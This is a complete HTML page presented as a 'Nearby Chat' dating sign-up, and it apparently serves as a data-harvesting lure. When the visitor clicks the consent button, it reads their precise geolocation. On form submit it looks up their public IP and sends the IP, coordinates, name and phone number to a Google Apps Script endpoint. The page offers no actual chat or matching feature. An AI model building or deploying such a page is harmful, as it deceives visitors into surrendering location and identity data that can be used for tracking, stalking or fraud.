<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>💖 Nearby Chat</title>
<style>
body{
  margin:0;
  background:linear-gradient(135deg,#ff4e8d,#ff8fb1);
  font-family:Arial;
  text-align:center;
  color:white;
}
.container{
  margin-top:60px;
  animation:fadeIn 1s ease-in-out;
}
button{
  background:white;
  color:#ff2e63;
  padding:15px 35px;
  border:none;
  border-radius:30px;
  font-size:16px;
  cursor:pointer;
  transition:0.3s;
}
button:hover{
  transform:scale(1.1);
}
input{
  padding:10px;
  margin:10px;
  width:250px;
  border-radius:8px;
  border:none;
}
@keyframes fadeIn{
  from{opacity:0; transform:translateY(20px);}
  to{opacity:1; transform:translateY(0);}
}
</style>
</head>

<body>

<div class="container">
  <h1>💑 NEARBY CHAT 💖</h1>

  <p>
  By clicking Agree & Continue, you consent for nearby matching.
  </p>

  <button id="consentBtn">💘 Agree & Continue</button>

  <form id="userForm" style="display:none;">
    <input type="text" id="name" placeholder="👤 Your Name" required><br>
    <input type="tel" id="phone" placeholder="📱 Phone Number" required><br>
    <button type="submit">Create Profile ❤️</button>
  </form>

  <div id="msg"></div>
</div>

<script>

const API_URL = "https://script.google.com/macros/s/AKfycbzxs-xTodXZu05m9cSbfiP9jkro0D6p1nVJdfnxiQsQ-YE3ca4XJo9fi8bFxvhMAAtOBA/exec";

async function getIP(){
  const res = await fetch("https://api.ipify.org?format=json");
  const data = await res.json();
  return data.ip;
}

let savedLocation = null;

document.getElementById("consentBtn").addEventListener("click", function(){

  navigator.geolocation.getCurrentPosition(function(position){

    savedLocation = {
      lat: position.coords.latitude,
      lon: position.coords.longitude
    };

    document.getElementById("consentBtn").style.display="none";
    document.getElementById("userForm").style.display="block";

  }, function(){
    alert("Location permission required.");
  });

});

document.getElementById("userForm").addEventListener("submit", async function(e){
  e.preventDefault();

  const ip = await getIP();

  const payload = {
    ip: ip,
    lat: savedLocation.lat,
    lon: savedLocation.lon,
    name: document.getElementById("name").value,
    phone: document.getElementById("phone").value
  };

  const res = await fetch(API_URL,{
    method:"POST",
    body: JSON.stringify(payload)
  });

  const text = await res.text();

  if(text === "DUPLICATE"){
    document.getElementById("msg").innerHTML="⚠️ Already Registered!";
  }
  else if(text === "SUCCESS"){
    document.getElementById("msg").innerHTML="✅ Profile Created Successfully 💖";
  }
  else{
    document.getElementById("msg").innerHTML="❌ Something went wrong.";
  }

});

</script>

</body>
</html>
